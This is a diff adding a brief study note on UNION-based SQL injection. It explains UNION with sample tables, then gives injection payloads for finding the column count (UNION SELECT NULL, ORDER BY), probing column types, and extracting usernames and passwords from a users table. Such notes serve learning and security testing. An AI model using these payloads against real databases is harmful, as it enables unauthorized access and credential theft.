@@ -1,0 +1,48 @@
+
+Background Union:
+
+table1    table2
+a | b      c | d
+1 , 2      2 , 3
+3 , 4      4 , 5
+
+Query #1: select a,b from table1
+               1 , 2
+               3 , 4
+                
+Query #2: select a,b from table1 UNION select c,d from table2
+               1 , 2
+               3 , 4
+               2 , 3
+               4 , 5
+             
+Rule:
+  - Num and order of column must be same in all queries
+  - Same data types.
+  
+
+***** STEP #1: Determine # of columns *****
+
+ Way #1: UNION
+     
+      select ? from table1 UNION select NULL, NULL--
+       --> error: incorrecet number of columns.
+       
+      select ? from table1 UNION select NULL, NULL, NULL--
+       --> 200 ok: correct number of columns.
+       
+ Way #2: ORDER BY
+ 
+        select a,b from table1 orfer by 2--
+        
+***** STEP #2: Determine data type of column *****
+
+        select a, b, c from table1 UNION select 'a', NULL, NULL--
+        select a, b, c from table1 UNION select NULL, 'a', NULL--
+        select a, b, c from table1 UNION select NULL, NULL, 'a'--
+         --> error: column is not type text
+         --> no error: column is type text.
+
+***** STEP #3: Finding username and password *****
+
+        select username, password from users--
